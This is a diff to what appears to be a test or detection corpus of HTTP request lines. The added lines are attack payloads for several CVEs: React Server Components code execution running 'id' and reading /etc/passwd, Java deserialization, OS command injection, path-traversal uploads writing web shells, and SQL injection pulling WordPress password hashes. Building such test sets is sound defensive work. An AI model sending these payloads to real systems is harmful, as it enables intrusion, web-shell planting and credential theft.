@@ -783,6 +783,37 @@ COPY /dav/ header="Destination: http://127.0.0.1:8080/dav/sub/"
 MOVE /dav/file.txt header="Destination: /dav/file.txt"
 MOVE /dav/ header="Destination: /dav/sub/"
 
+# --- CVE-2025-55182 (React Server Components, "React2Shell"): the Flight
+#     protocol deserializes a multipart Server Function payload from an
+#     unauthenticated POST; the root object sets a fake "then" and reaches
+#     Function through :constructor:constructor. ---
+POST / header="Next-Action: x" header="Content-Type: multipart/form-data; boundary=----x" body="Content-Disposition: form-data; name=\"0\" {\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('id');\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}"
+POST / header="Next-Action: sync" header="Content-Type: multipart/form-data; boundary=----x" body="Content-Disposition: form-data; name=\"0\" {\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"_response\":{\"_prefix\":\"require('child_process').execSync('cat /etc/passwd')\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}"
+
+# --- CVE-2025-26399 (SolarWinds Web Help Desk): unauthenticated Java
+#     deserialization through the AjaxProxy WebObjects action. ---
+POST /helpdesk/WebObjects/Helpdesk.woa/wa/AjaxProxy header="Content-Type: application/json" body="{\"javaClass\":\"java.lang.ProcessBuilder\",\"javaCode\":\"id\"}"
+POST /helpdesk/WebObjects/Helpdesk.woa/wa/AjaxProxy body="javaClass=java.lang.Runtime&javaCode=id"
+
+# --- CVE-2026-105134 (Ahsay AhsayCBS): OS command injection in the random
+#     argument of the Replication Receiver JSON API. ---
+POST /rps/api/json/UpdateReceivers.do body="random=1;id"
+POST /rps/api/json/UpdateReceivers.do header="Content-Type: application/json" body="{\"random\":\"1;id;uname -a\"}"
+
+# --- CVE-2025-52691 (SmarterMail) and CVE-2026-48908 / CVE-2026-56290
+#     (Joomla SP Page Builder, Page Builder CK): unauthenticated uploads that
+#     write an executable into the webroot. ---
+POST /api/upload body="Content-Disposition: form-data; name=\"file\"; filename=\"../../wwwroot/shell.aspx\""
+POST /api/upload body="Content-Disposition: form-data; name=\"file\"; filename=\"..%2F..%2Fwwwroot%2Fshell.aspx\""
+POST /index.php?option=com_sppagebuilder&task=media.upload body="Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\""
+POST /index.php?option=com_pagebuilderck&task=upload body="Content-Disposition: form-data; name=\"file\"; filename=\"../../images/shell.php\""
+
+# --- CVE-2026-9082 (Drupal core) and CVE-2026-63030 (WordPress REST batch):
+#     SQL injection reaching the query layer. ---
+GET /index.php?q=1%20union%20select%201,2,3
+GET /jsonapi?filter[uid][value]=1%20AND%20sleep(5)
+POST /wp-json/batch/v1 header="Content-Type: application/json" body="{\"requests\":[{\"path\":\"/wp/v2/posts?author__not_in=1)union/**/select/**/user_pass/**/from/**/wp_users--\"}]}"
+
 # Classes that still need connection-level framing, a malicious upstream, or
 # configuration-specific state; no request line can express them.
 # CVE-2026-42533 (nginx): the HTTP variant needs a regex map and regex location
